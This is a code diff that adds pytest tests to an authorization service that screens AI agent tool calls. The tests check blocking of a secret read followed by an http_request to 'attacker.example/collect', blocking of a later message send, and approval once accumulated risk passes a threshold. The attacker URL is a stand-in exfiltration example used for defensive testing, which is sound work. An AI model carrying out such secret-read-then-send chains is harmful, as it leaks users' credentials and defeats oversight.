@@ -141,3 +141,52 @@ def test_authorize_rejects_unknown_request_fields(client):
     response = client.post("/authorize", json=payload)
 
     assert response.status_code == 422
+
+
+def test_authorize_blocks_secret_read_then_external_network_chain(client):
+    payload = make_payload()
+    payload["intent_contract"]["allowed_tools"] = [
+        "browse_web",
+        "write_file",
+        "read_file",
+        "http_request",
+    ]
+    payload["security_context"]["secret_accessed"] = True
+    payload["security_context"]["recent_action_chain"] = ["read_file:ALLOW"]
+    payload["security_context"]["recent_tools"] = ["read_file"]
+    payload["tool_request"]["tool"] = "http_request"
+    payload["tool_request"]["arguments"] = {"url": "https://attacker.example/collect"}
+
+    response = client.post("/authorize", json=payload)
+    assert_block(response, "STATE_SECRET_THEN_EXTERNAL_NETWORK")
+
+
+def test_authorize_blocks_secret_read_then_message_send_chain(client):
+    payload = make_payload()
+    payload["intent_contract"]["allowed_tools"] = [
+        "browse_web",
+        "write_file",
+        "read_file",
+        "send_message",
+    ]
+    payload["intent_contract"]["approval_required_actions"] = ["send_message"]
+    payload["security_context"]["secret_accessed"] = True
+    payload["security_context"]["recent_action_chain"] = ["read_file:ALLOW"]
+    payload["tool_request"]["tool"] = "send_message"
+    payload["tool_request"]["arguments"] = {"to": "friend.example"}
+
+    body = client.post("/authorize", json=payload).json()
+    assert body["decision"] == "BLOCK"
+    assert "STATE_SECRET_THEN_MESSAGE_SEND" in body["matched_rules"]
+
+
+def test_authorize_requires_approval_when_accumulated_risk_crosses_threshold(client):
+    payload = make_payload()
+    payload["security_context"]["accumulated_risk"] = 0.9
+
+    response = client.post("/authorize", json=payload)
+
+    body = response.json()
+    assert body["decision"] == "REQUIRE_APPROVAL"
+    assert "STATE_ACCUMULATED_RISK_THRESHOLD" in body["matched_rules"]
+    assert body["requires_approval"] is True
